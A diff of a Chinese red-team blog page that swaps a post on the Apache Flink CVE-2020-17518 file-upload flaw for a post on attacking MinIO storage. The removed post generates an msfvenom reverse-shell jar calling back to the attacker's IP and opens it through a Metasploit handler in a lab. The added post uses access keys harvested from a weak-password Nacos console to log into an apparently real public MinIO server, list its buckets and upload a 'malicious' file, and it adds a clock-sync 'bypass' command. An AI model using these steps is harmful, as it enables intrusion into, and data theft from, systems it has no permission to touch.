@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x00 漏洞描述 Apache\u00a0Flink\u00a0是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。\n编号：CVE-2020-17518\nFlink 1.5.1引入了REST\u00a0API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。\n">
-<title>【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="0x00 介绍 Minio是一款高性能的对象存储服务，支持Amazon S3云存储服务接口。\n0x01 攻击条件 当我们挖掘nacos漏洞时，使用弱口令进入到系统后，这里会有很多配置文件，这些配置文件会记录一些敏感信息。\n敏感信息如下：\n">
+<title>【Minio】云存储服务接口攻击技巧</title>
 
-<link rel='canonical' href='http://localhost:1313/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
+<link rel='canonical' href='http://localhost:1313/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/'>
 
-<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【CVE-2020-17518】Apache Flink任意文件上传漏洞复现">
-<meta property='og:description' content="0x00 漏洞描述 Apache\u00a0Flink\u00a0是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。\n编号：CVE-2020-17518\nFlink 1.5.1引入了REST\u00a0API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。\n">
-<meta property='og:url' content='http://localhost:1313/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
+<link rel="stylesheet" href="/scss/style.min.ded09199e10d7e343e92a3d06815e1792f7733e4086835e30d0740e630f272ae.css"><meta property='og:title' content="【Minio】云存储服务接口攻击技巧">
+<meta property='og:description' content="0x00 介绍 Minio是一款高性能的对象存储服务，支持Amazon S3云存储服务接口。\n0x01 攻击条件 当我们挖掘nacos漏洞时，使用弱口令进入到系统后，这里会有很多配置文件，这些配置文件会记录一些敏感信息。\n敏感信息如下：\n">
+<meta property='og:url' content='http://localhost:1313/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/'>
 <meta property='og:site_name' content='SlimerのBlog'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-14T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/94.webp' />
-<meta name="twitter:title" content="【CVE-2020-17518】Apache Flink任意文件上传漏洞复现">
-<meta name="twitter:description" content="0x00 漏洞描述 Apache\u00a0Flink\u00a0是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。\n编号：CVE-2020-17518\nFlink 1.5.1引入了REST\u00a0API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='http://localhost:1313/images/94.webp' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-10-15T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1313/images/95.webp' />
+<meta name="twitter:title" content="【Minio】云存储服务接口攻击技巧">
+<meta name="twitter:description" content="0x00 介绍 Minio是一款高性能的对象存储服务，支持Amazon S3云存储服务接口。\n0x01 攻击条件 当我们挖掘nacos漏洞时，使用弱口令进入到系统后，这里会有很多配置文件，这些配置文件会记录一些敏感信息。\n敏感信息如下：\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/images/95.webp' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -232,13 +232,11 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#0x00-漏洞描述">0x00 漏洞描述</a></li>
-    <li><a href="#0x01-影响范围">0x01 影响范围</a></li>
-    <li><a href="#0x02-环境搭建">0x02 环境搭建</a></li>
-    <li><a href="#0x03-漏洞复现">0x03 漏洞复现</a></li>
-    <li><a href="#0x04-漏洞利用">0x04 漏洞利用</a></li>
-    <li><a href="#0x05-漏洞检测">0x05 漏洞检测</a></li>
-    <li><a href="#0x06-漏洞修复">0x06 漏洞修复</a></li>
+    <li><a href="#0x00-介绍">0x00 介绍</a></li>
+    <li><a href="#0x01-攻击条件">0x01 攻击条件</a></li>
+    <li><a href="#0x02-条件">0x02 条件</a></li>
+    <li><a href="#0x03-利用">0x03 利用</a></li>
+    <li><a href="#0x04-绕过技巧">0x04 绕过技巧</a></li>
   </ul>
 </nav>
         </div>
@@ -253,9 +251,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+            <a href="/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/">
                 
-                    <img src="/images/94.webp" loading="lazy" alt="Featured image of post 【CVE-2020-17518】Apache Flink任意文件上传漏洞复现" />
+                    <img src="/images/95.webp" loading="lazy" alt="Featured image of post 【Minio】云存储服务接口攻击技巧" />
                 
             </a>
         </div>
@@ -264,10 +262,6 @@
     <div class="article-details">
     
     <header class="article-category">
-        
-            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="background-color: #1d3557; color: #f1faee;">
-                渗透测试
-            </a>
         
             <a href="/categories/%E7%BA%A2%E9%98%9F/" style="background-color: #ff6b6b; color: #ffffff;">
                 红队
@@ -279,7 +273,7 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</a>
+            <a href="/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/">【Minio】云存储服务接口攻击技巧</a>
         </h2>
     
         
@@ -303,10 +297,10 @@
   <path d="M7 3v4" />
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
-</svg>2025年10月14日</time>
+</svg>2025年10月15日</time>
                 <span class="article-word-count">
                     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M14 2H6a2 2 0 0 0 -2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2 -2V8z" /><polyline points="14 2 14 8 20 8" /><line x1="16" y1="13" x2="8" y2="13" /><line x1="16" y1="17" x2="8" y2="17" /><polyline points="10 9 9 9 8 9" /></svg>
-                    文章共611字
+                    文章共847字
                 </span>
             </div>
 			
@@ -325,117 +319,171 @@
     <section class="article-content">
     
     
-    <h1 id="0x00-漏洞描述">0x00 漏洞描述</h1>
-<p>Apache <a href="https://so.csdn.net/so/search?q=Flink&amp;spm=1001.2101.3001.7020">Flink</a> 是由Apache软件基金会开发的开源流处理框架，其核心是用Java和Scala编写的分布式流数据流引擎。Flink以数据并行和流水线方式执行任意流数据程序，Flink的流水线运行时系统可以执行批处理和流处理程序。<br>
-编号：CVE-2020-17518<br>
-Flink 1.5.1引入了REST API，但其实现上存在多处缺陷，导致目录遍历和任意文件写入漏洞。</p>
-<h1 id="0x01-影响范围">0x01 影响范围</h1>
-<p>Apache Flink 1.5.1 ~ 1.11.2</p>
-<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
-<p>启动vulhub_kali_linux<br>
-进入vulhub靶场已经给CVE-2020-17518搭建好的环境</p>
+    <h1 id="0x00-介绍">0x00 介绍</h1>
+<p>Minio是一款高性能的对象存储服务，支持Amazon S3云存储服务接口。</p>
+<h1 id="0x01-攻击条件">0x01 攻击条件</h1>
+<p>当我们挖掘nacos漏洞时，使用弱口令进入到系统后，这里会有很多配置文件，这些配置文件会记录一些敏感信息。<br>
+敏感信息如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">rabbit
+</span></span><span class="line"><span class="cl">redis
+</span></span><span class="line"><span class="cl">mysql
+</span></span><span class="line"><span class="cl">minio
+</span></span><span class="line"><span class="cl">ak/sk
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="0x02-条件">0x02 条件</h1>
+<p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015164434.png" alt="image.png"></p>
+<h1 id="0x03-利用">0x03 利用</h1>
+<p>如何利用起来呢？<br>
+这里就说一下minio怎么进行攻击利用。<br>
+首先我们需要先安装一下mc工具<br>
+这里我直接使用kali进行安装</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd vulhub/flink/CVE-2020-17518
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget https://dl.min.io/client/mc/release/linux-amd64/mc
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>使用docker启动flink环境</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker-compose up -d
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>环境启动后,本机访问</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://192.168.197.137:8081
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014162842.png" alt="image.png"></p>
-<h1 id="0x03-漏洞复现">0x03 漏洞复现</h1>
-<p>上传任意文件,进行bp抓包<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014162952.png" alt="image.png"><br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014163008.png" alt="image.png"><br>
-在filename字段值修改为jar后缀名 ,发送请求,回显的状态码200以及参数说明上传成功<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014163049.png" alt="image.png"><br>
-回显的信息发现上传文件的位置:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">flink</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">fc404e92</span><span class="o">-</span><span class="n">f1db</span><span class="o">-</span><span class="mi">4258</span><span class="o">-</span><span class="mf">923e-10</span><span class="n">f2199225eb</span><span class="o">/</span><span class="n">flink</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">upload</span><span class="o">/</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h1 id="0x04-漏洞利用">0x04 漏洞利用</h1>
-<p>使用kali的msfvenom工具,生成文件的目录自定义<br>
-lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为文件路径以及文件名</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">msfvenom -p java/shell_reverse_tcp lhost=192.168.197.129 lport=1314 -f jar &gt;/home/slimer/桌面/2.jar
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014164618.png" alt="image.png"><br>
-启动msf监听</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">msfconsole</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置监听模块</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">multi</span><span class="o">/</span><span class="n">handler</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置</span><span class="w"> </span><span class="n">payload</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">java</span><span class="o">/</span><span class="n">shell_reverse_tcp</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置监听</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">地址</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lhost</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">197</span><span class="p">.</span><span class="na">129</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">设置监听端口</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">set</span><span class="w"> </span><span class="n">lport</span><span class="w"> </span><span class="n">1314</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">#</span><span class="w"> </span><span class="n">执行</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">run</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014165222.png" alt="image.png"><br>
-上传<code>2.jar</code>文件<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014165011.png" alt="image.png"><br>
-成功监听：<br>
-<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251014164932.png" alt="image.png"></p>
-<h1 id="0x05-漏洞检测">0x05 漏洞检测</h1>
-<p>可以通过分析apache日志来检测攻击。</p>
-<h1 id="0x06-漏洞修复">0x06 漏洞修复</h1>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015160937.png" alt="image.png"><br>
+赋予执行权限并移动到系统路径</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">官方已发布安全版本，请及时下载升级至安全版本。</span>
-</span></span><span class="line"><span class="cl"><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">flink</span><span class="o">.</span><span class="n">apache</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">zh</span><span class="o">/</span><span class="n">downloads</span><span class="o">.</span><span class="n">html</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x mc          <span class="c1"># 赋予可执行权限</span>
+</span></span><span class="line"><span class="cl">sudo mv mc /usr/local/bin/  <span class="c1"># 移动到系统 PATH 路径，方便全局调用</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>验证安装</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mc --version
+</span></span><span class="line"><span class="cl"><span class="c1"># 示例输出：mc version RELEASE.2024-05-08T17-11-57Z (commit-id=...)</span>
+</span></span></code></pre></td></tr></table>
 </div>
+</div><p>安装完成后，即可在 Kali 终端中执行你提供的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mc alias set my-minio http://125.34.90.154:9000 PWjVFMxxxxkakthh Lm4I01IQd5OX1xxxxx45UlascuH
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这条命令怎么来的呢？</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">set</span> <span class="nx">my</span><span class="o">-</span><span class="nx">minio：设置一个名字</span>
+</span></span><span class="line"><span class="cl"><span class="nx">http</span><span class="o">://</span><span class="mf">125.34</span><span class="o">.</span><span class="mf">90.154</span><span class="o">:</span><span class="mi">9000</span><span class="nx">：路径</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PWjVFxxxMkakthh：access</span><span class="o">-</span><span class="nx">key</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Lm4I01IQd5OXxxxscuH：secret</span><span class="o">-</span><span class="nx">key</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里可以看到nacos里的配置：<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162657.png" alt="image.png"><br>
+如果所有配置正常这里会回显成功。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162848.png" alt="image.png"><br>
+如果配置错误这里也会显示错误提示。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162911.png" alt="image.png"><br>
+看一下这个里面有什么文件，可以看到这里有4个文件夹。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mc ls my-minio/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015162954.png" alt="image.png"><br>
+然后我们先看第一个文件夹里面有什么数据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mc ls my-minio/solicitation
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163102.png" alt="image.png"><br>
+然后再随便跟一个文件夹，看一下有什么东西没：<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163147.png" alt="image.png"><br>
+可以看到有一个1.png文件。<br>
+然后直接访问这个路径，记得把my-minio删掉，发现可以直接显示图片。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163244.png" alt="image.png"><br>
+然后我们尝试是否能文件上传到桶里面：<br>
+首先创建一个文件。<br>
+<img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163414.png" alt="image.png"><br>
+上传恶意文件<br>
+这里你可以随便上传到哪里，反正有目录了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mc cp test.php my-minio/solicitation/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163558.png" alt="image.png"><br>
+可以看到已经上传成功了。<br>
+访问一下这个路径，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">solicitation/test.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163649.png" alt="image.png"><br>
+发现直接下载，并没有解析。<br>
+删除</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mc rm --force test.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015163856.png" alt="image.png"></p>
+<h1 id="0x04-绕过技巧">0x04 绕过技巧</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SERVER_TIME=$(curl -s -I &#34;[http://127.0.0.1:9000&#34;](http://125.34.90.154:9000/&#34;) | grep -i &#34;date:&#34; | cut -d&#39;:&#39; -f2- | sed &#39;s/^ *//&#39;); sudo date -s &#34;$SERVER_TIME&#34; &amp;&amp; ./mc ls my-minio/solicitation
+</span></span><span class="line"><span class="cl">这个命令主要是绕过/mc ls my-minio/solicitation可以在这个地方添加命令。
+</span></span><span class="line"><span class="cl">如果你仔细的情况下可以观察到：SERVER_TIME=$(curl -s -I &#34;[http://127.0.0.1:9000&#34;](http://125.34.90.154:9000/&#34;) | grep -i &#34;date:&#34; | cut -d&#39;:&#39; -f2- | sed &#39;s/^ *//&#39;); sudo date -s &#34;$SERVER_TIME&#34; 前面无论如何都是这种命令，因为帮助我们绕过，后面只需跟&amp;&amp; 然后mc基础命令即可。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20251015164235.png" alt="image.png"></p>
+
 </section>
 
 
@@ -459,56 +507,18 @@ lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为�
             
                 
 <article class="has-image">
-    <a href="/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
+    <a href="/p/cve-2020-17518apache-flink%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/82.webp" loading="lazy" data-key="" data-hash="/images/82.webp"/>
+                    <img src="/images/94.webp" loading="lazy" data-key="" data-hash="/images/94.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【资产收集】ENScan_Go-信息收集工具</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/minio%E4%BA%91%E5%AD%98%E5%82%A8%E6%9C%8D%E5%8A%A1%E6%8E%A5%E5%8F%A3%E6%94%BB%E5%87%BB%E6%8A%80%E5%B7%A7/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/95.webp" loading="lazy" data-key="" data-hash="/images/95.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【Minio】云存储服务接口攻击技巧</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95disconf-%E7%9A%84%E9%BB%98%E8%AE%A4%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/93.webp" loading="lazy" data-key="" data-hash="/images/93.webp"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">【渗透测试】Disconf 的默认账户密码</h2>
+            <h2 class="article-title">【CVE-2020-17518】Apache Flink任意文件上传漏洞复现</h2>
         </div>
     </a>
 </article>
@@ -535,18 +545,56 @@ lhost为kali_linux的IP地址   lport为kali_linux的端口  &gt;后面为�
             
                 
 <article class="has-image">
-    <a href="/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%AB%98%E5%8D%B1/">
+    <a href="/p/%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86enscan_go-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/85.webp" loading="lazy" data-key="" data-hash="/images/85.webp"/>
+                    <img src="/images/82.webp" loading="lazy" data-key="" data-hash="/images/82.webp"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">【渗透测试】任意用户密码修改（高危）</h2>
+            <h2 class="article-title">【资产收集】ENScan_Go-信息收集工具</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/spring-boot%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2016-4977/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/52.webp" loading="lazy" data-key="" data-hash="/images/52.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【Spring Boot】远程命令执行漏洞（CVE-2016-4977）</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/spring-web%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Ccve-2017-4971/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/53.webp" loading="lazy" data-key="" data-hash="/images/53.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">【Spring Web】框架远程代码执行（CVE-2017-4971）</h2>
         </div>
     </a>
 </article>
